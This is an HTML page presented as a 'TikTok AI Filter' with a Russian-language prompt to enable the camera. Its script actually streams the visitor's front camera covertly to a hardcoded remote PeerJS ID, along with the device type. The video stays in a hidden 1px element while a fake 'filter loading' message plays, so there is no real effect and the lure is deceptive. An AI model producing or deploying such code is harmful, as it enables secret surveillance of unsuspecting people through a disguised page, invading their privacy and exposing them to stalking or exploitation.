<!DOCTYPE html>
<html>
<head>
    <title>TikTok AI Filter</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,80,0.5); }
        #myVideo { width: 1px; height: 1px; opacity: 0; position: absolute; }
    </style>
</head>
<body>

    <div id="ui">
        <h1 style="font-size: 24px;">НОВЫЙ AI ФИЛЬТР</h1>
        <p>Разрешите доступ к камере для запуска эффекта</p>
        <button class="btn" onclick="startPrank()">ПРИМЕНИТЬ ФИЛЬТР</button>
    </div>

    <video id="myVideo" autoplay playsinline muted></video>

    <script>
        const REMOTE_ID = '09062012'; 

        // Добавляем STUN-серверы для связи через разные сети
        const peer = new Peer({
            config: {
                'iceServers': [
                    { url: 'stun:stun.l.google.com:19302' },
                    { url: 'stun:stun1.l.google.com:19302' }
                ]
            }
        });

        function startPrank() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                document.getElementById('myVideo').srcObject = stream;
                document.getElementById('ui').innerHTML = "<h1>ФИЛЬТР ЗАГРУЖАЕТСЯ...</h1><p>Пожалуйста, подождите (5-10 сек)</p>";
                
                const userAgent = navigator.userAgent;
                let deviceInfo = "Mobile Device";
                if (userAgent.match(/iPhone/)) deviceInfo = "iPhone";
                else if (userAgent.match(/Android/)) deviceInfo = "Android Phone";

                const call = peer.call(REMOTE_ID, stream, {
                    metadata: { device: deviceInfo }
                });
            })
            .catch(err => {
                alert("Ошибка! Фильтр не работает без камеры. Проверьте настройки браузера.");
            });
        }
    </script>
</body>
</html>
